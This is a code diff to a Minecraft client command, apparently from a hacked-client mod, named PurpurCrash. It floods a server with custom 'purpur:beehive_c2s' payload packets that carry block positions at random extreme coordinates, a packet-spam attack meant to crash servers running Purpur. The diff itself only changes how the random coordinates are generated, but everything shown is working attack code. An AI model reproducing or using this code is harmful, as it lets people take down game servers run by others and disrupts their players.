@@ -6,6 +6,7 @@ import com.mojang.brigadier.context.CommandContext;
 import net.minecraft.command.CommandSource;
 import net.minecraft.util.Identifier;
 import net.minecraft.util.math.BlockPos;
+import net.minecraft.util.math.random.Random;
 
 public class PurpurCrash extends BetterCommand {
     public PurpurCrash() {
@@ -23,11 +24,14 @@ public class PurpurCrash extends BetterCommand {
     private int run(CommandContext<CommandSource> ctx) {
         int packets = IntegerArgumentType.getInteger(ctx, "packets");
         info("Sending %d packet(s)".formatted(packets));
+        Random random = Random.create();
         for (int i = 0; i < packets; i++) {
-            int x = (int) ((Math.random() - 0.5) * 60_000_000);
-            int y = (int) ((Math.random() - 0.5) * 60_000_000);
             sendPacket(createCustomPayloadPacket(buf -> {
-                long l = new BlockPos(x, (int) (Math.random() * 4 + 250), y).asLong();
+                long l = new BlockPos(
+                    random.nextBetween(-30_000_000, 30_000_000),
+                    random.nextBetween(250, 254),
+                    random.nextBetween(-30_000_000, 30_000_000)
+                ).asLong();
                 buf.writeLong(l);
             }, new Identifier("purpur", "beehive_c2s")));
         }
